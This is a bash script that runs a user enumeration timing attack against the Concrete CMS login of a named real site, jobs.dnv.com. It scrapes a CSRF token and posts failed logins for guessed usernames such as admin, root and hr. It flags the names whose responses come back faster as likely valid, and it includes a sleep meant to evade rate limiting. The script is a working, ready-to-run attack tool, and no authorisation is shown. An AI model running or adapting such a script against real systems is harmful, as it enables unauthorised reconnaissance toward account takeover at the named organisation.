#!/bin/bash
# User Enumeration via Timing Attack - Unauthenticated

TARGET="https://jobs.dnv.com"

echo "=== USER ENUMERATION VIA TIMING ATTACK ==="
echo "Testing if valid usernames respond faster than invalid ones..."
echo ""

# Get token
TOKEN=$(curl -c /tmp/enum_cookies.txt -s "${TARGET}/index.php?cID=156%00" | grep -oP 'name="ccm_token" value="\K[^"]+')
echo "Token: $TOKEN"
echo ""

# Test users
INVALID_USER="nonexistent_xyz_987654321"
VALID_USERS=("admin" "administrator" "root" "support" "help" "jobs" "hr" "recruitment" "dnv")

echo "Running 5 iterations to confirm timing pattern..."
echo ""

for i in {1..5}; do
    echo "=== Iteration $i ==="

    # Test invalid user (baseline)
    START=$(date +%s%N)
    curl -b /tmp/enum_cookies.txt -s -o /dev/null \
        -X POST "${TARGET}/login/authenticate/concrete" \
        -H "Referer: ${TARGET}/index.php/login" \
        -H "Origin: ${TARGET}" \
        -d "uName=${INVALID_USER}&uPassword=wrongpass&ccm_token=${TOKEN}"
    END=$(date +%s%N)
    INVALID_TIME=$(((END - START) / 1000000))
    printf "%-30s: %4dms (INVALID - baseline)\n" "$INVALID_USER" "$INVALID_TIME"

    # Test potentially valid users
    for user in "${VALID_USERS[@]}"; do
        START=$(date +%s%N)
        curl -b /tmp/enum_cookies.txt -s -o /dev/null \
            -X POST "${TARGET}/login/authenticate/concrete" \
            -H "Referer: ${TARGET}/index.php/login" \
            -H "Origin: ${TARGET}" \
            -d "uName=${user}&uPassword=wrongpass&ccm_token=${TOKEN}"
        END=$(date +%s%N)
        USER_TIME=$(((END - START) / 1000000))

        # Calculate difference
        DIFF=$((INVALID_TIME - USER_TIME))

        printf "%-30s: %4dms (diff: %+4dms)" "$user" "$USER_TIME" "$DIFF"

        # Flag if significantly faster (>50ms)
        if [ $DIFF -gt 50 ]; then
            echo " ⚠️ LIKELY VALID USER!"
        else
            echo ""
        fi
    done

    echo ""
    sleep 1  # Avoid rate limiting
done

echo "=== ANALYSIS ==="
echo "If certain usernames consistently respond 50ms+ faster than invalid ones,"
echo "those usernames likely exist in the system (user enumeration vulnerability)."
